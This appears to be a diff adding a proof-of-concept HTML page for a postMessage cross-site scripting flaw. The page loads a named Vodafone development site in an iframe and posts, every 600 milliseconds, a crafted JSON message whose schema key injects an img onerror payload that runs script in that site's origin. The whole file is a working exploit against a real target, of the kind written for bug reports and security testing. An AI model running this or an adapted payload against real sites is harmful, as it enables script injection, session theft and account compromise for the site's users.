@@ -1,0 +1,17 @@
+<html>
+<iframe id=f src="https://dev-butterfly-mkt.vodafone.es/" width=900 height=300></iframe>
+<script>
+var S = {
+  e: "requestedSchema",
+  a1: {
+    schema: [{
+      key: `a.b.</option><img src=x onerror="alert(document['domain'])">`,
+      type: "Text"
+    }]
+  }
+};
+var f=document.getElementById('f');
+f.addEventListener('load',function(){setInterval(function(){
+  f.contentWindow.postMessage(JSON.stringify(S),'*');},600);});
+</script>
+</html>
